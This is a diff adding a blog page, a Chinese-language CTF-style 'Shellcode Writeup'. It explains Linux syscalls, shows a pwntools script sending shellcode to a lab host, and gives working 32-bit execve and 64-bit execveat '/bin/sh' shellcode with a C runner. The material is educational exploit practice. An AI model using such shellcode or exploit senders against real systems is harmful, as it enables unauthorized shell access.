@@ -1,0 +1,327 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Shellcode Writeup | Reticence</title>
+<link rel="shortcut icon" href="http://127.0.0.1:8080/favicon.ico?v=1619508275369">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="http://127.0.0.1:8080/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Shellcode Writeup | Reticence - Atom Feed" href="http://127.0.0.1:8080/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?197e96d6e079d4c80f9674c92eb62002";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-90HNEFFE0M"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-90HNEFFE0M');
+</script>
+
+
+    <meta name="description" content="shellcode网：http://shell-storm.org/shellcode/
+Linux系统调用：https://reticenceji.github.io/files/Linux%E7%B3%BB%E7%BB%9F%E8%B0..." />
+    <meta name="keywords" content="WriteUps" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="http://127.0.0.1:8080">
+  <img class="avatar" src="http://127.0.0.1:8080/images/avatar.png?v=1619508275369" alt="">
+  </a>
+  <h1 class="site-title">
+    Reticence
+  </h1>
+  <p class="site-description">
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?197e96d6e079d4c80f9674c92eb62002";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          Index
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          Classification
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          Archives
+        </a>
+      
+    
+      
+        <a href="/navigator.html" class="menu">
+          Navigator
+        </a>
+      
+    
+      
+        <a href="/post/book-list" class="menu">
+          Booklist
+        </a>
+      
+    
+      
+        <a href="/post/fei-md-ge-shi-bi-ji-hui-zong" class="menu">
+          Notes
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          About
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/reticenceji" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+        <a href="https://www.zhihu.com/people/reticenceji" target="_blank">
+          <i class="ri-zhihu-line"></i>
+        </a>
+      
+    
+      
+    
+  </div>
+  <script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?197e96d6e079d4c80f9674c92eb62002";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+  </script>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Shellcode Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-08-11
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="http://127.0.0.1:8080/tag/4n7nIsyFy/" class="post-tag">
+                  # WriteUps
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>shellcode网：http://shell-storm.org/shellcode/<br>
+Linux系统调用：https://reticenceji.github.io/files/Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7%E8%A1%A8.pdf</p>
+<h2 id="系统调用">系统调用</h2>
+<p>简单的说，把调用号赋给eax，参数依次给寄存器，int x80。<br>
+比如下面的execve。<br>
+系统调用号表：/usr/include/asm/unistd.h</p>
+<p>一开始想用pwntools自带的shellcode生成器。</p>
+<pre><code>from pwn import * 
+#连接
+con = remote('10.214.160.13',11003)
+#通过context设置上下文
+context(arch='i386',os='linux',bits=32)
+shellcode = asm(shellcraft.sh())
+con.send(shellcode)
+con.interactive()
+</code></pre>
+<p>不过不行。原因应该是程序对输入做了限制在35个字符之内。</p>
+<h2 id="shellcode如下">shellcode如下</h2>
+<pre><code>/*push '/bin///sh\x00' */
+push 0x68
+push 0x732f2f2f
+push 0x6e69622f
+/* call execve('esp,0,0) */
+mov ebx,esp
+xor ecx,ecx
+push 0xb
+pop eax
+cdq     /*set edx to 0,eax is known to be positive*/
+int 0x80
+</code></pre>
+<ul>
+<li>cdq—Convert Double to Quad (386+)，该指令把edx扩展为eax的高位，也就是说变为64位。<br>
+用pwntool 汇编一下发送就好了。<br>
+简单分析一下<br>
+<img src="http://127.0.0.1:8080/post-images/1597129719370.png" alt="" loading="lazy"></li>
+</ul>
+<p>这里还有一个64位版本的shellcode</p>
+<pre><code>/** x86_64 execveat(&quot;/bin//sh&quot;) 29 bytes shellcode
+
+--[ AUTHORS
+	* ZadYree
+	* vaelio
+	* DaShrooms
+
+~ Armature Technologies R&amp;D
+
+--[ asm
+6a 42                   push   0x42
+58                      pop    rax
+fe c4                   inc    ah
+48 99                   cqo
+52                      push   rdx
+48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
+2f 73 68
+57                      push   rdi
+54                      push   rsp
+5e                      pop    rsi
+49 89 d0                mov    r8, rdx
+49 89 d2                mov    r10, rdx
+0f 05                   syscall
+
+--[ COMPILE
+gcc execveat.c -o execveat # NX-compatible :)
+
+**/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+
+const uint8_t sc[29] = {
+    0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,
+    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
+    0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05
+};
+
+/** str
+\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf
+\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54
+\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05
+**/
+
+int main (void)
+{
+  ((void (*) (void)) sc) ();
+  return EXIT_SUCCESS;
+}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">系统调用</a></li>
+<li><a href="#shellcode%E5%A6%82%E4%B8%8B">shellcode如下</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="http://127.0.0.1:8080/post/gai-tong-fu-xi/">
+              <h3 class="post-title">
+                概统复习
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="http://127.0.0.1:8080/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
